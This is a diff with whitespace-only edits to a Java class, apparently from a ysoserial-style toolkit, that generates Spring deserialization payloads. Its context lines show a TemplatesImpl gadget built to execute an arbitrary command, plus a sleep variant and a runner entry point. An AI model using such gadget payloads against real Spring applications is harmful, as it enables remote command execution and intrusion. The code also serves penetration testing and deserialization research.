@@ -49,7 +49,7 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 @SuppressWarnings({"restriction", "rawtypes"})
 @Dependencies({"org.springframework:spring-core:4.1.4.RELEASE","org.springframework:spring-beans:4.1.4.RELEASE"})
 public class Spring1 extends PayloadRunner implements ObjectPayload<Object> {
-
+	
 	public Object getObjectExec(final String command) throws Exception {
 		final TemplatesImpl templates = Gadgets.createTemplatesImplExec(command);
 		
@@ -69,7 +69,7 @@ public class Spring1 extends PayloadRunner implements ObjectPayload<Object> {
 		Reflections.setFieldValue(mitp, "methodName", "newTransformer");
 
 		return mitp;
-	}	
+	}
 	
 	public Object getObjectSleep(final String command) throws Exception {
 		final TemplatesImpl templates = Gadgets.createTemplatesImplSleep(command);
@@ -90,7 +90,7 @@ public class Spring1 extends PayloadRunner implements ObjectPayload<Object> {
 		Reflections.setFieldValue(mitp, "methodName", "newTransformer");
 
 		return mitp;
-	}
+	}	
 
 	public static void main(final String[] args) throws Exception {
 		PayloadRunner.run(Spring1.class, args);
